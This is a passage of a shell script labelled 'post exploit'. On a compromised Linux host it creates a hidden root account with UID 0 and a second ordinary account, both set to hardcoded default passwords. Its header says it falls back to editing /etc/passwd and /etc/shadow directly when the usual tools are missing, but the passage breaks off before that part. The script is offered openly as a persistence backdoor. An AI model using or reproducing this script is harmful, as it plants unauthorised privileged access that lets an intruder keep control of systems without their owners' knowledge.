post exploit.
create a root user and a normal user

should run this script by *root* user

it will exec *useradd* and *chpasswd* normally, and you can change the
username and password.

however, it would edit */etc/passwd* and */etc/shadow* file directly to add
user when *useradd* and *chpasswd* is not *executable*.

default username / password :
                               ffake / p@ssw3rd135246
                               ffakenormal / p@ssw3rd135246
!


if test "$(which useradd)" && test "$(which chpasswd)"; then
    # add user with `useradd` and `chpasswd` normally
    # change this
    name="ffake"
    pass="p@ssw3rd135246"
    normalUser="ffakenormal"

    # add a normal user
    if useradd $normalUser; then
       echo "user ${normalUser} has been created."
    else
       echo "create user ${normalUser} failure."
       exit 1
    fi

    # add a root user
    if useradd -o -u 0 -g 0 $name; then
       echo "user ${name} has been created."
    else
       echo "create user ${name} failure."
       exit 1
    fi

    # set password
    #
    # just work in bash
    #echo -e "$pass\n$pass" | passwd "$name" &>/dev/null
    #
    # work in bash and sh
    if echo "${name}:${pass}" | chpasswd >/dev/null 2>&1; then
       echo "${name}'s password has been changed."
    else
       echo "change ${name}'s password failure."
       exit 1
    fi

    if echo "${normalUser}:${pass}" | chpasswd >/dev/null 2>&1; then
       echo "${normalUser}'s password has been changed."
    else

       exit 1
